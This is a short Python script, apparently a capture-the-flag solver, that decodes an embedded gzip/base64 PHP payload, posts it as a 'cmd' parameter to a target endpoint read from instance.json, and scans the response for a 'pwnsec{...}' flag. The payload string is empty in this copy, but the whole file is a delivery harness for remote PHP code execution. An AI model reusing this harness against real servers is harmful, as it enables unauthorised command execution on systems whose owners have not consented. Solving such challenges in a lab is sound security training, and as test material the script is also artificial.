from __future__ import annotations

import base64
import gzip
import json
import re
import sys
import urllib.parse
import urllib.request
from pathlib import Path


PAYLOAD_GZIP_B64 = """

"""


def fail(message: str) -> "NoReturn":
    sys.stderr.write(message + "\n")
    raise SystemExit(1)


def main() -> None:
    root = Path(__file__).resolve().parent
    try:
        instance = json.loads((root / "instance.json").read_text(encoding="utf-8"))
        url = instance["endpoints"][0]["url"]
        php = gzip.decompress(base64.b64decode(PAYLOAD_GZIP_B64)).decode("utf-8")
        php = php.split("<?php", 1)[1]
        body = urllib.parse.urlencode({"cmd": php}).encode("ascii")
        request = urllib.request.Request(url, data=body, method="POST")
        with urllib.request.urlopen(request, timeout=50) as response:
            output = response.read().decode("utf-8", errors="replace")
    except Exception as exc:
        fail(f"request failed: {exc}")

    match = re.search(r"pwnsec\{[0-9a-f]+\}", output)
    if match is None:
        fail("exploit completed without a valid flag")
    sys.stdout.buffer.write(match.group(0).encode("utf-8"))


if __name__ == "__main__":
    main()
